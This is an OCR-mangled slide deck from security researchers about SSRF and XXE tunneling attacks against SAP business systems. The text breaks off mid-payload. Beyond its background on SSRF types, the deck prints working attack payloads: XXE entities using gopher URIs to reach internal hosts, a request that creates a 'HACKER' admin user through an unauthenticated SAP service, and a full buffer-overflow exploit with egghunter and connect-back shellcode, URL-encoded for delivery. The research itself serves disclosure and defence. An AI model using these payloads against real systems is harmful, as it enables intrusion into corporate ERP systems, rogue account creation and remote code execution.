Invest  in  security   to  secure  investments  
SSRF  vs.  Business--cri0cal  applica0ons:  
XXE  tunneling  in  SAP     
Alexander  Polyakov  ­  CTO  at  ERPScan   Dmitry  Chastukhin  ­  Principal  Researcher  at  ERPScan        

  
Please  download  the  latest  version  of   presenta2on  from  here:  
h5p://erpscan.com/category/presenta2ons/  

Alexander  Polyakov  
Business  applica2on   security  expert  

Dmitry  Chastuchin  
An  alumnus  of  St.  Petersburg  State  Polytechnic  University,  computer  science   department,  he  works  upon  SAP  security,  par0cularly  upon  Web  applica0ons  and   JAVA  systems.  He  has  official  acknowledgements  from  SAP  for  the  vulnerabili0es   found.      Dmitriy  is  also  a  WEB  2.0  and  social  network  security  geek  who  found  several  cri0cal   bugs  in  Yandex  services  (Russian  largest  search  engine),  Google,  Adobe,  Vkontakte   (vk.com),  the  Russian  largest  social  network.  He  is  a  contributor  to  the  OWASP--EAS   project.  He  spoke  at  the  following  conferences:  Hack  in  the  Box  and  BruCON.      Ac0vely  par0cipates  in  the  life  of  the  Russian  Defcon  Group.  

Agenda  
  
· Enterprise  applica2ons  
­ Defini2ons     ­ Typical  enterprise  landscape   ­ Enterprise  threats  and  defense  
· SSRF    
­ History   ­ Types   ­ XXE  Tunneling  
· A5acking  SAP  with  SSRF  
­ New  life  for  old  a5acks   ­ Bypassing  security  restric2ons   ­ Exploi2ng  other  services  
· XXE  Scanner  
· Conclusion  

Enterprise  applica0ons:  Defini0ons  
              Business  soKware  is  generally  any  soKware  that   helps   business   to   increase   its   efficiency   or   measure  their  performance  
   · Small  (MS  Office)  
· Medium  (CRM,  Shops)  
· Enterprise  (ERP,  BW...)  
  

Why  are  they  cri0cal?  
              Any  informa2on  an  a5acker  might  want,  be  it  a   cybercriminal,   industrial   spy   or   compe2tor,   is   stored   in   a   company's   ERP.   This   informa2on   can   include   financial,   customer   or   public   rela2ons,   intellectual   property,   personally   iden2fiable   informa2on   and   more.   Industrial   espionage,   sabotage  and  fraud  or  insider  embezzlement  may   be   very   effec2ve   if   targeted   at   the   vic2m's   ERP   system   and   cause   significant   damage   to   the   business.  

Business--cri0cal  systems  architecture  
· Located  in  a  secure  subnetwork        · Secured  by  firewalls      · Monitored  by  IDS  systems  
· Regularly  patched  
  

Noahhh...  

But  let's  assume  that  they  are,   because  it  will  be  much  more   interes2ng  to  a5ack  them  

   The     Internet     

Secure  corporate  network  

Corporate   network  

ERP     network  

Industrial   network  

But  wait.   There  must  be  some  links!  

The   Internet     

Real  corporate  network  

Corporate   network  

ERP     network  

Industrial   network  

And...   A5ackers  can  use  them!  

Corporate  network  a[ack  scenario  

The   Internet     

Corporate   network  

ERP     network  

Industrial   network  

But  how?  

SSRF  

SSRF  History:  the  beginning  
· SSRF,  as  in  Server  Side  Request  Forgery.     · An  a5ack  which  was  discussed  in  2008  with  very  
li5le  informa2on  about  theory  and  prac2cal   examples.     · Like  any  new  term,  the  SSRF  doesn't  show  us   something  completely  new  like  a  new  type  of   vulnerability.  SSRF--style  a5acks  were  known   before.       

SSRF  History:  Basics  
· We  send  Packet  A  to  Service  A   · Service  A  ini2ates  Packet  B  to  service  B   · Services  can  be  on  the  same  or  different  hosts   · We  can  manipulate  some  fields  of  packet  B  within  
packet  A   · Various  SSRF  a5acks  depend  on  how  many  fields  
we  can  control  on  packet  B     
Packet  A   Packet  B  

SSRF    history:  World  research  
· DeralHeiland  ­  Shmoocon  2008  
­ Web   Portals   Gateway   To   Informa2on   Or   A   Hole   In   Our   Perimeter  Defenses  
­ Web   portlets   allow   loading   files   from   other   HTTP   sources  
­ Possible  to  a5ack  internal  network   ­ SSRF  via  URL  parameter  
· Spiderlabs  2012  
­ h5p://blog.spiderlabs.com/2012/05/too--xxe--for--my-- shirt.html  
­ SSRF  via  XXE  
· Vladimir  Vorontsov  2012  
­   SSRF  via  XXE  
  

SSRF  history:  My  research    
  
· SSRF  is  much  more  than  listed  examples   · Begun  thinking  about  different  kinds  of  
SSRF  in  2009   · Played  with  Oracle  database  hacks  
while  wri2ng  a  book           The  idea  was  to  use  minimum  rights  in  
one  applica2on  to  send  something  that   can  make  maximum  impact  on  another   applica2on.  

SSRF  History:  My  research  in  Oracle  bypass  
  
· Problem  
­ An  old  vulnerability  in  Oracle  listener  in  Set_log_file   ­ Secured  by  LOCAL_OS_AUTHENTICATION  in  10G     
· A5ack  
­ User  with  CONNECT  privileges  can  run  UTL_TCP   func2ons  
­ Using  UTL_TCP  it  is  possible  to  construct  any  TCP   packet  and  send  it  to  the  listener  
­ Connec2on  will  be  from  a  local  IP  so  we  will  bypass   LOCAL_OS_AUTHENTICATION  restric2ons  
    

SSRF  History:    ERPScan's  research  in  SMBRealy  
  
· SMBRelay  is  another  example  of  SSRF   · A  UNC  request  can  be  ini2ated  from  different  sources   · We  have  collected  informa2on  about  different  ways  to  
call  UNC  path  having  minimum  rights  
   ­ From  SAP  NetWeaver  ABAP   ­ From  SAP  NetWeaver  J2EE   ­ From  MSSQL   ­ From  Oracle  DB   ­ From  browser   ­ From  USB   ­ By  spoofing   ­ Etc.  
·   It  is  published  under  the  name  "SMBRelay  Bible"  
    

SSRF    history:  How  to  exploit  

Vulnerability  needed  
· File  include   · SQL  Injec2on   · XXE   · Etc.  

Account  needed  
· Call  h5p://  scheme   · load  UNC  paths   · Use  trusted  
connec2ons   · Etc.  

SSRF  history:  Conclusion  
What  we  wanted  to  do  here:  
   · Collect  the  informa2on  about  SSRF  a5acks   · Categorize  them   · Show  new  SSRF  a5acks   · Show  examples  of  SSRF  in  SAP    
  

SSRF  at  a  glance    

Corporate   network  

Secure     network  

Packet  B  

Ideal  SSRF  
              The  idea  is  to  find  vic2m  server  interfaces  that   will   allow   sending   packets   ini2ated   by   the   vic2m   server   to   the   localhost   interface   of   the   vic2m   server   or   to   another   server   secured   by   a   firewall   from  outside.  Ideally  this  interface  :  
  
· Must  allow  sending  any  packet  to  any  host  and  any  port   · Must  be  accessed  remotely  without  authen2ca2on    
  

SSRF  Types    
· Trusted  SSRF  (Can  forge  requests  to  remote  
services  but  only  to  predefined  ones)  
· Remote   SSRF   (Can   forge   requests   to   any  
remote  IP  and  port)  
­ Simple  Remote  SSRF  (No  control  on  app   level)  
­ Par0al      Remote   SSRF   (Control   in   some   fields  of  app  level)  
­ Full  Remote  SSRF  (Control  on  app  level)  

Trusted  SSRF    
· Trusted  because  they  can  be  exploited   through  predefined  trusted  connec2ons.    
· RDBMS  systems  and  ERP  systems    give  you   the  func2onality  to  make  trusted  links.  
· Through  those  predefined  links,  the  a5acker   can  send  some  packets  to  linked  systems.  
· Need  to  have  access  to  the  applica2on  or  a   vulnerability  like  SQL  Injec2on.  
· Examples  
­ SAP  NetWeaver     ­ Oracle  DB   ­ MsSQL  DB  

Trusted  SSRF:  MsSQL  
  
· Need  at  least  public  rights   · Use  MsSQL  trusted  links   · Can  be  used  with  predefined  passwords   · Can  be  used  to  obtain  info  from  host  B     
Select  *  from  openquery(ServiceB,'select  *  from  @@version')]  

Trusted  SSRF:  Oracle  Database  
· Need  at  least  public  rights   · Use  Oracle  trusted  links   · Can  be  used  with  predefined  passwords   · Can  be  used  to  and  obtain  responses  from  
Host  B.       
SELECT  *  FROM  myTable@HostB   EXECUTE  Schema.Package.Procedure('Parameter')@HostB  
  
  

SSRF  Types:    SAP  
· SAP  NetWeaver  can  have  trusted  links   · Predefined  in  SM59  transac2on   · Use  RFC  protocol  and  user  authen2ca2on   · Usually  with  predefined  passwords   · Usually  with  SAP_ALL  rights   · Can  be  secured  by  bit.ly/MkD7Ub       
   Can  be  exploited  by  connec2ng  from  TST  to  
PRD  system  

Trusted  SSRF:  Conclusion  
· Advantages  for  the  a5acker  
­ Interes2ng     ­ There  are  examples  of  dangerous  a5acks   ­ Links  usually  exists  across  the  enterprise     ­ A5ack   is   very   stealthy   because   the  
behavior  looks  normal  
· Disadvantages  
­ Username  and  password  needed   ­ Exis2ng  link  needed        

Remote  SSRF  
More  interes2ng  class:   · Control  what  to  send  and  how   · Forge   requests   to   any   host   and   any   port  
from   a   trusted   source   even   if   you   cannot   connect  to  those  hosts  directly   · Connect   to   services   which   only   listen   localhost  interface  as  well   · Depending  on  what  exactly  we  can  control   there  are  at  least  3  types  of  Remote  SSRFs  
  
  

  Remote  SSRF:  Subtypes  

Simple  

Par2al    

Full  

Can't  control     Packet  B  applica2on  level  

Control  some  fields  in  

Control  all  fields  in  

Packet  B  applica2on  level   Packet  B  applica2on  level  

Dest  IP   Dest  port  
Applica2on  level   packet  

Dest  IP   Dest  port  
Applica2on  level   packet  

Dest  IP   Dest  port  
Applica2on  level   packet  

Simple  Remote  SSRF:  Ability  to  send  something  
  
· The  most  popular  example  is  the  ability  to   remotely  scan  for  open  ports  and  IP  addresses  
· Affected  soKware:  
­ SAP  NetWeaver  wsnavigator  (sapnote  1394544,871394)   ­ SAP  NetWeaver  ipcpricing  (sapnote  1545883)   ­ SAP  BusinessObjects  viewrpt  (sapnote  1583610)  
     

Simple  Remote  SSRF:  port  scan  via  ipcpricing  JSP    
·   It  is  possible  to  scan  internal  network  from  the  Internet   ·   Authen2ca2on  is  not  required   ·   SAP  NetWeaver  J2EE  engine  is  vulnerable           /ipcpricing/ui/BufferOverview.jsp?  
server=172.16.0.13     &  port=31337     &  dispatcher=     &  targetClient=     &  view=  
  

Simple  Remote  SSRF:  Port  scan  via  ipcpricing  JSP    

Host  is  not  alive   Port  closed  

HTTP  port  
SAP  port  

Par0al  Remote  SSRF:  Ability  to  control  fields  
  
The  most  popular  type  with  many  examples  
· Remote  Login  bruteforce   · Remote  File  read   · SMBrelay   · HTTP  A5acks  to  other  services   · XXE  a5acks  
     

Simple  Remote  SSRF:  Login  bruteforce        
· SAP  J2EE  web  applica2on   · S2ll  patching  (can't  disclose)   · Possible  to  connect  to  any  host  and  test  
password     · If   service   is   running   on   external   SAP  
Portal   it   is   possible   to   remotely   from   the  Internet:  
­ Bruteforce   logins   to   internal   resources   and   then  con2nue  with  other  a5acks  
­ Bruteforce  logins  un2l  they  are  locked  (Denial   of  Service)  
  

Par0al  Remote  SSRF:  SMBRelay    
· SMBRelay   ­   a   Windows   bug   which   can   be   exploited   by   forging  a  UNC  connec2on  to  system  that  we  control  
· As   a   result,   it   is   possible   to   get   access   to   Windows   server   within  rights  of  <SID>adm  user    
· Dozens  of  different  possibili2es  to  forge  a  UNC  connec2on  
­ From  SAP  webservices  (sapnote  1503579,1498575)   ­ From  RFC  func2ons  (sapnote  1554030)  
­ From  SAP  transac2ons,  reports  (sapnote  1583286)  
Possible  from  every  place  where  you  can  call  something   from  remote  path  like\\172.16.0.1\file  but  you  need  to  be  
inside  the  network  

Par0al  Remote  SSRF:  HTTP  a[acks  to  other  services  
· Many  places  where  you  can  call  HTTP  URLs   ­ Transac2ons   ­ Reports   ­ RFC  func2ons   ­ Web  services   ­ XML  En00es  
· Connec2on   will   be   ini2ated   by   server   to   another   server   so   you   can   bypass   firewall   restric2ons  
     

Par0al  Remote  SSRF:  HTTP  a[acks  to  other  services  

Corporate   network  
Direct  a5ack       GET  /vuln.jsp    
SSRF  A5ack    

HTTP  Server    
SSRF  A5ack     Get  /vuln.jst    

192.168.0.1  

172.16.0.1  

XXE  A[acks  on  other  services  
  
· Via  XXE  it  is  also  possible  to  run  HTTP  calls  
   <?xml  version="1.0"  encoding="ISO--8859--1"?>     <!DOCTYPE  foo  [       <!ELEMENT  foo  ANY  >     <!ENTITY  xxe1  SYSTEM  "h[p://172.16.0.1:80/someservice"  >]>   <foo>&xxe1;</foo>  
   · Successfully   executed   a   similar   a5ack   on   a  
banking  system  during  a  pen--test.     

XXE  A[acks  in  SAP  
· There   are   many   XML   interfaces   in   a   SAP   applica2on  
· Many  of  them  are  vulnerable  to  XXE     · There  are  patches  from  SAP   · Most  of  those  services  require  authen2ca2on   · But  we  want  to  do  this  without  auth  

DilbertMSG  Web  service  in  SAP    
· DilbertMSG  web  service   · No  I'm  not  kidding   · Use  Soap  XML   · For  tes2ng  purpose   · Shipped  with  SAP  PI  <  7.1  by  default   · Accessed  without  authoriza2on   · Patched  just  month  ago  in  SAP  Security  note  1707494  
    Epic!  

DilbertMSG  Web  service  in  SAP    

What  can  we  do  next  ?  
· Usually,  XXE  is  used  to  call  an  HTTP  or  UNC  path   · But   there   are   much   more   interes2ng   op2ons  
depending  on  the  parser:  
­ up://   ­ ldap://   ­ jar://   ­ gopher://   ­ mailto://   ­ ssh2://  
· All   of   them   allow   connec2ng   to   special   services   and  send  special  commands  (Par2al  SSRF)  
· But  they  are  not  universal...  or     

Okay,  so  Full  Remote  SSRF    

  Full  Remote  SSRF  
Server  A  (Portal  or  XI)    

Packet  A   Packet  B  

192.168.0.1  

Packet  B  

Server  B  (ERP,  HR,   BW  etc.)  
Exploit  

172.16.0.1  

How?  

Gopher  uri  scheme  
<?xml  version="1.0"  encoding="ISO--8859--1"?>     <!DOCTYPE  foo  [       <!ELEMENT  foo  ANY  >     <!ENTITY  date  SYSTEM  "gopher://172.16.0.1:3300/AAAAAAAAA"  >]>     <foo>&date;</foo>  
  
What  will  happen??  

XXE  Tunneling  
Server  A  (Portal  or  XI)    

POST  /XISOAPAdapter/servlet/ com.sap.aii.af.mp.soap.web.DilbertMSG? format=post  HTTP/1.1   Host:  192.168.0.1:8000      <?xml  version="1.0"  encoding="ISO--8859--1"?>     <!DOCTYPE  foo  [       <!ELEMENT  foo  ANY  >     <!ENTITY  date  SYSTEM  "gopher:// 172.16.0.1:3300/AAAAAAAAA"  >]>     <foo>&date;</foo>  

192.168.0.1  

AAAAAAAAAAAAA  

Server  B  (ERP,   HR,  BW  etc.)  
Port   3300  

telnet  172.16.0.1  3300  

172.16.0.1  

Exploi2ng  SAP  with  XXE  tunnel  

Why  SAP?  
· Because  we  spend  a  lot  of  2me   researching  SAP  
· Because  it  is  a  very  popular  business   applica2on    
· Because  we  found  an  XML  interface   with  XXE  which  can  be  exploited   anonymously  
· Because  we  can  :))     

Remote  SSRF  threats  
· Exploit  OS  vulnerabili2es     
· Exploit  old  SAP  Applica0on   vulnerabili0es    
· Bypass  SAP  security  restric2ons  
· Exploit  vulnerabili2es  in  local  services  

XXE  Tunneling  to  Verb  Tampering    
· Verb  Tampering  architecture  vulnerability  in  SAP  J2EE   engine  
· Was  presented  by  me  at  the  previous  BlackHat   · Patched  by  SAP  in  security  note  1589525     · Allows  unauthorized  access  to  NetWeaver  web  services    
­ Crea2on  new  user  with  any  role   ­ Run  OS  commands   ­ Remotely  turn  OFF  applica2on  server   · Many  companies  s2ll  don't  patch     · Some  companies  disable  access  by  WebDispatcher    (ACL)   · It  means  that  the  vulnerability  s2ll  exists  

XXE  Tunneling  to  Verb  Tampering    

POST  /XISOAPAdapter/servlet/ com.sap.aii.af.mp.soap.web.DilbertMSG? format=post  HTTP/1.1   Host:  company.com:  80      <?xml  version="1.0"   encoding="ISO--8859--1"?>     <!DOCTYPE  foo  [       <!ELEMENT  foo  ANY  >     <!ENTITY  date  SYSTEM  "gopher:// 172.16.0.1:3300/HEAD  /ctc/ConfigServlet?   param=com.sap.ctc.u0l.UserConfig;   CREATEUSER;   USERNAME=HACKER,PASSWORD=PassW0rd "  >]>     <foo>&date;</foo>  

Server  A  on  the  Internet   (WebDispatcher)    

h5p://company.com  

To  172.16.0.1  port  50000      /HEAD  /ctc/ConfigServlet? param=com.sap.ctc.u0l.UserConfi g;CREATEUSER;USERNAME=HACK ER,PASSWORD=PassW0rd  

Server  B  in  DMZ   (SAP  Portal)  

No  such  service  404       (filtered  by  WebDispatcher)  

Port  50000   J2EE  CTC   service  

GET  /CTC            

172.16.0.1  

XXE  Tunneling  to  Buffer  Overflow  
· A  buffer  overflow  vulnerability  found  by  Virtual   Forge  in  ABAP  Kernel  (fixed  in    sapnote  1487330)  
· Hard  to  exploit  because  it  requires  calling  an  RFC   func2on  which  calls  Kernel  func2on  
· But  even  such  a  complex  a5ack  can  be  exploited   · Get  ready  for  the  hardcore  

XXE  Tunneling  to  Buffer  Overflow  (Hint  1)  
    
· It  is  hard  (maybe  not  possible)  to  exploit  it  by  an   RFC  call  because  it  needs  mul2ple  packets  to  call   the  RFC  func2on  
· So  we  decided  to  exploit  it  via  WEBRFC   · Can  be  fixed  by  sapnotes:  
1394100,1536640,1528822,1453457   · According  to  our  report,  even  on  the  Internet  
WEBRFC  is  installed  in  40%  of  NetWeaver  ABAP  
  

XXE  Tunneling  to  Buffer  Overflow  (Hint  2)  
· Shellcode  size  is  limited  to  255  bytes  (name   parameter)  
· As  we  don't  have  direct    connec2on  to  the   Internet  from  the  vulnerable  system,  we  want  to   use  DNS  tunneling  shellcode  to  connect  back  
· But  the  XML  engine  saves  some  XML  data  in  RWX   memory  
· So  we  can  use  egghunter   · Any  shellcode  can  be  uploaded     

XXE  Tunneling  to  Buffer  Overflow:  Packet  B      
POST  /sap/bc/soap/rfc?sap--client=000  HTTP/1.1   Authoriza2on:  Basic  U1FQKjowMjA3NTk3==   Host:  company.com:80   User--Agent:  ERPSCAN  Pentes2ng  tool  v  0.2   Content--Type:  text/xml;  charset=u--8   Cookie:  sap--client=000   Content--Length:  2271        <SOAP--ENV:Envelope  xmlns:SOAP--ENV="h5p://schemas.xmlsoap.org/soap/envelope/"  xmlns:SOAP--ENC="h5p://
schemas.xmlsoap.org/soap/encoding/"  xmlns:xsi="h5p://www.w3.org/2001/XMLSchema--instance"  xmlns:xsd="h5p:// www.w3.org/2001/XMLSchema"><SOAP--ENV:Body><m:RSPO_R_SAPGPARAM  xmlns:m="urn:sap-- com:document:sap:rfc:func2ons"><HEAP_EGG>dsecdsechff,4diFkDwj02Dwk0D7AuEE4y4O3f2s3a064M7n2M0e0P2N5 k054N4r4n0G4z3c4M3O4o8M4q0F3417005O1n7L3m0Z0O0J4l8O0j0y7L5m3E2r0b0m0E1O4w0Z3z3B4Z0r2H3b3G7m8n 0p3B1N1m4Q8P4s2K4W4C8L3v3U3h5O0t3B3h3i3Z7k0a0q3D0F0p4k2H3l0n3h5L0u7k3P2p0018058N0a3q1K8L4Q2m1O 0D8K3R0H2v0c8m5p2t5o4z0K3r7o0S4s0s3y4y3Z5p0Y5K0c053q5M0h3q4t3B0d0D3n4N0G3p082L4s1K5o3q012s4z2H0y 1k4C0B153X3j0G4n2J0X0W7o3K2Z260j2N4j0x2q2H4S0w030g323h3i127N165n3Z0W4N390Y2q4z4o2o3r0U3t2o0a3p4o 3T0x4k315N3i0I3q164I0Q0p8O3A07040M0A3u4P3A7p3B2t058n3Q02VTX10X41PZ41H4A4K1TG91TGFVTZ32PZNBFZDW E02DWF0D71DJE5I4N3V6340065M2Z6M1R112NOK066N5G4Z0C5J425J3N8N8M5AML4D17015OKN7M3X0Z1K0J388N0Z 1N0MOL3B621S1Q1T1O5GKK3JJO4P1E0X423GMMNO6P3B141M4Q3A5C7N4W4C8M9R3U485HK03B49499J2Z0V1F3EM L0QJK2O482N494M1D173Q110018049N7J401K9L9X101O0N3Z450J161T5M90649U4ZMM3S9Y1C5C1C9Y3S3Z300Y5K1X 2D9P4M6M9T5D3B1T0D9N4O0M3T082L5D2KOO9V0J0W5J2H1N7Z4D62LO3H9O1FJN7M0Y1PMO3J0G2I1ZLO3D0X612 O4T2C010G353948137O074X4V0W4O5Z68615JJOLO9R0T9ULO1V8K384E1HJK305N44KP9RKK4I0Q6P3U3J2F032J0A9W4 S4Q2A9U69659R4A06aaaaaaaaaaaaaaaaaaaaa</ HEAP_EGG><NAME>&#186;&#255;&#255;&#206;&#060;&#102;&#129;&#202;&#255;&#015;&#066;&#082;&#106;&#0 67;&#088;&#205;&#046;&#060;&#005;&#090;&#116;&#239;&#184;&#100;&#115;&#101;&#099;&#139;&#250;&#175; &#117;&#234;&#175;&#117;&#231;&#255;&#231;&#144;&#144;&#144;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAA&#158;&#14;&#190;&#171;DSEC&#094;&#023;&#012;&#001;&#252;&#049;&#0 43;&#001;&#212;&#083;&#242;&#000;&#018;&#058;&#071;&#000;&#250;&#047;&#057;&#016;&#076;&#255;&#084; &#000;&#001;&#002;&#000;&#000;&#226;&#020;&#095;&#000;&#064;&#000;&#000;&#000;&#097;&#125;&#088;&# 016;&#115;&#167;&#113;&#002;&#117;&#218;&#157;&#000;&#004;&#128;&#069;&#000;&#082;&#089;&#012;&#016 ;&#235;&#004;&#235;&#002;&#134;&#027;&#198;&#000;&#255;&#255;&#233;&#077;&#255;&#255;&#255;&#255;AA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</NAME></ m:RSPO_R_SAPGPARAM></SOAP--ENV:Body></SOAP--ENV:Envelope>     

XXE  Tunneling  to  Buffer  Overflow  (Hint  3)  

· Next  step  is  to  pack  this  packet  B  into  Packet  A    

· We  need  to  insert  non--printable  symbols    

· God  bless  gopher;  it  supports  urlencode  like  HTTP  

· It  will  also  help  us  evade  a5ack  against  IDS  systems  

  

  

Packet  A  

POST  /XISOAPAdapter/servlet/com.sap.aii.af.mp.soap.web.DilbertMSG?format=post  HTTP/1.1   Host:  sapserver.com:80   Content--Length:  7730      <?xml  version="1.0"  encoding="ISO--8859--1"?>     <!DOCTYPE  foo  [       <!ELEMENT  foo  ANY  >     <!ENTITY  date  SYSTEM  "gopher://[Urlencoded  Packet  B]"  >]>     <foo>&date;</foo>  

Final  exploit:  Packet  B  in  packet  A  
   POST /XISOAPAdapter/servlet/com.sap.aii.af.mp.soap.web.DilbertMSG?format=post  HTTP/1.1  
Host:  sapserver.com:80   Content--Length:  7730      <?xml  version="1.0"  encoding="UTF--8"?><!DOCTYPE  in  [<!ENTITY  foo  SYSTEM  "gopher://172.16.10.65:8000/%50%4f%53%54%20%2f%73%61%70%2f%62%63%2f%73%6f%61%70%2f%72%66%63%3f
%73%61%70%2d%63%6c%69%65%6e%74%3d%30%30%30%20%48%54%54%50%2f%31%2e%31%0d%0a%41%75%74%68%6f%72%69%7a%61%74%69%6f%6e%3a %20%42%61%73%69%63%20%55%30%46%51%4b%6a%70%74%61%57%35%70%63%32%46%77%0d%0a%48%6f%73%74%3a%20%31%37%32%2e%31%36%2e%31%30%2e%36%35%3a %38%30%30%30%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%45%52%50%53%43%41%4e%20%50%65%6e%74%65%73%74%69%6e%67%20%74%6f%6f%6c%20%76%20%30%2e %32%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%74%65%78%74%2f%78%6d%6c%3b%20%63%68%61%72%73%65%74%3d%75%74%66%2d%38%0d%0a%43%6f%6f%6b %69%65%3a%20%73%61%70%2d%63%6c%69%65%6e%74%3d%30%30%30%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%32%32%37%31%0d%0a%0d%0a%3c%53%4f %41%50%2d%45%4e%56%3a%45%6e%76%65%6c%6f%70%65%20%78%6d%6c%6e%73%3a%53%4f%41%50%2d%45%4e%56%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e %78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%73%6f%61%70%2f%65%6e%76%65%6c%6f%70%65%2f%22%20%78%6d%6c%6e%73%3a%53%4f%41%50%2d%45%4e%43%3d %22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%73%6f%61%70%2f%65%6e%63%6f%64%69%6e%67%2f%22%20%78%6d%6c%6e %73%3a%78%73%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d%61%2d%69%6e%73%74%61%6e %63%65%22%20%78%6d%6c%6e%73%3a%78%73%64%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d %61%22%3e%3c%53%4f%41%50%2d%45%4e%56%3a%42%6f%64%79%3e%3c%6d%3a%52%53%50%4f%5f%52%5f%53%41%50%47%50%41%52%41%4d%20%78%6d%6c%6e%73%3a%6d%3d %22%75%72%6e%3a%73%61%70%2d%63%6f%6d%3a%64%6f%63%75%6d%65%6e%74%3a%73%61%70%3a%72%66%63%3a%66%75%6e%63%74%69%6f%6e%73%22%3e%3c%48%45%41%50%5f %45%47%47%3e%64%73%65%63%64%73%65%63%68%66%66%66%66%6b%34%64%69%46%6b%44%77%6a%30%32%44%77%6b%30%44%37%41%75%45%45%34%79%34%4f %33%66%32%73%33%61%30%36%34%4d%37%6e%32%4d%30%65%30%50%32%4e%35%6b%30%35%34%4e%34%72%34%6e%3047%34%7a%33%63%34%4d%33%4f%34%6f%38%4d %34%71%30%46%33%34%31%37%30%30%35%4f%31%6e%37%4c%33%6d%30%5a%30%4f%30%4a%34%6c%38%4f%30%6a%30%79%37%4c%35%6d%33%45%32%72%30%62%30%6d %30%45%31%4f%34%77%30%5a%33%7a%33%42%34%5a%30%72%32%48%33%62%33%47%37%6d%38%6e%30%70%33%42%31%4e%31%6d%34%51%38%50%34%73%32%4b %34%57%34%43%38%4c%33%76%33%55%33%68%35%4f%30%74%33%42%33%68%33%69%33%5a%37%6b%30%61%30%71%33%44%30%46%30%70%34%6b%32%48%33%6c%30%6e %33%68%35%4c%30%75%37%6b%33%50%32%70%30%30%31%38%30%35%38%4e%30%61%33%71%31%4b%38%4c%34%51%32%6d%31%4f%30%44%38%4b %33%52%30%48%32%76%30%63%38%6d%35%70%32%74%35%6f%34%7a%30%4b%33%72%38%6f%30%53%34%73%30%73%33%79%34%79%33%5a%35%70%30%59%35%4b %30%63%30%35%33%71%35%4d%30%68%33%71%34%74%33%42%30%64%30%44%33%6e%34%4e%30%47%33%70%30%38%32%4c%34%73%31%4b%35%6f%33%71%30%31%32%73%34%7a %32%48%30%79%31%6b%34%43%30%42%31%35%33%58%33%6a%30%47%34%6e%32%4a%30%58%30%57%37%6f%33%4b%32%5a%32%43%30%6a%32%4e%34%6a %30%78%32%71%32%48%34%53%30%77%30%33%30%67%33%32%33%68%33%69%31%32%37%4e%31%36%35%6e%33%5a%30%57%34%4e%33%39%30%59%32%71%34%7a%34%6f%32%6f %33%72%30%55%33%74%32%6f%30%61%33%70%34%6f%33%54%30%78%34%6b%33%31%35%4e%33%69%30%49%33%71%31%36%34%49%30%51%30%70%38%4f %33%41%30%37%30%34%30%4d%30%41%33%75%34%50%33%41%37%70%33%42%32%74%30%35%38%6e%33%51%30%32%56%54%58%31%3058%34%31%50%5a%34%31%48%34%41%34%4b %31%54%47%39%31%54%47%46%56%54%5a%33%32%50%5a%4e%42%46%5a%44%57%45%30%32%44%57%46%30%44%37%31%44%4a%45%35%49%34%4e %33%56%36%33%34%30%30%36%35%4d%32%5a%36%4d%31%52%31%31%32%4e%4f%4b%30%34%34%4e%35%47%34%5a%30%43%35%4a%34%32%35%4a%33%4e%38%4e%38%4d%35%41%4d %4c%34%44%31%37%30%31%35%4f%4b%4e%37%4d%33%58%30%5a%31%4b%30%4a%33%38%38%4e%30%5a%31%4e%30%4d%4f%4c%33%42%36%32%31%53%31%51%31%54%31%4f %35%47%4b%4b%33%4a%4a%4f%34%50%31%45%30%58%34%32%33%47%4d%4d%4e%4f%36%50%33%42%31%34%31%4d%34%51%33%41%35%43%37%4e%34%57%34%43%38%4d %39%52%33%55%34%38%35%48%4b%30%33%42%34%39%34%39%39%4a%32%5a%30%56%31%46%33%45%4d%4c%30%51%4a%4b%32%4f%34%38%32%4e%34%39%34%4d %31%44%31%37%33%51%31%31%30%30%31%38%30%34%39%4e%37%4a%34%30%31%4b%39%4c%39%58%31%30%31%4f%30%4e%33%5a%34%35%30%4a%31%36%31%54%35%4d %39%30%36%34%39%55%34%5a%4d%4d%33%53%39%59%31%43%35%43%31%43%39%59%33%53%33%5a%33%30%30%59%35%4b%31%58%32%44%39%50%34%4d%36%4d %39%54%35%44%33%42%31%54%30%44%39%4e%34%4f%30%4d%33%54%30%38%32%4c%35%44%32%4b%4f%f%39%56%30%4a%30%57%35%4a%32%48%31%4e%37%5a%34%44%36%32%4c%4f %33%48%39%4f%31%46%4a%4e%37%4d%30%59%31%50%4d%4f%33%4a%30%47%32%49%31%5a%4c%4f%33%44%30%58%36%31%32%4f %34%54%32%43%30%31%30%47%33%35%33%39%34%38%31%33%37%4f%30%37%34%58%34%56%30%57%34%4f%35%5a%36%38%36%31%35%4a%4a%4f%4c%4f%39%52%30%54%39%55%4c%4f %31%56%38%4b%33%38%34%45%31%48%4a%4b%33%30%35%4e%34%34%4b%50%39%52%4b%4b%34%49%30%51%36%50%33%55%33%4a%32%46%30%33%32%4a %30%41%39%57%34%53%34%51%32%41%39%55%36%39%36%35%39%52%34%41%30%36%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%3c%2f %48%45%41%50%5f%45%47%47%3e%3c%4e%41%4d%45%3e%26%23%31%38%36%3b%26%23%32%35%35%3b%26%23%32%35%35%3b%26%23%32%30%36%3b%26%23%30%36%30%3b %26%23%31%30%32%3b%26%23%31%32%39%3b%26%23%32%30%32%3b%26%23%32%35%35%3b%26%23%30%31%35%3b%26%23%30%36%36%3b%26%23%30%38%32%3b %26%23%31%30%36%3b%26%23%30%36%37%3b%26%23%30%38%38%3b%26%23%32%30%35%3b%26%23%30%34%36%3b%26%23%30%36%30%3b%26%23%30%30%35%3b %26%23%30%39%30%3b%26%23%31%31%36%3b%26%23%32%33%39%3b%26%23%31%38%34%3b%26%23%31%30%30%3b%26%23%31%31%35%3b%26%23%31%30%31%3b 